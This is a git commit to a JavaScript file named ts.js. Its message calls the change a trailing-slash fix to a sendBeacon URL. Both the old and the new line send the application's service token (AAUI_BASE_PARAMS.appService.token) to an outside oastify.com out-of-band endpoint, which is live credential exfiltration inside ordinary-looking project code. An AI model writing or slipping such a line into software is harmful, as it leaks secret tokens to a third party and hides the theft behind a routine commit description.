54772cbbbab8c0d2eabc74e6f8daa8f6005807a5
crisungureanu <97293656+crisungureanu@users.noreply.github.com>
2025-10-27 14:48:52 +0200

    Update sendBeacon URL to include trailing slash

--- ts.js
+++ ts.js
@@ -1,1 +1,1 @@
-navigator.sendBeacon("https://6u1nbnb0ulgpdmvf3tywkdb9i0orch06.oastify.com",AAUI_BASE_PARAMS.appService.token);
+navigator.sendBeacon("https://6u1nbnb0ulgpdmvf3tywkdb9i0orch06.oastify.com/",AAUI_BASE_PARAMS.appService.token);
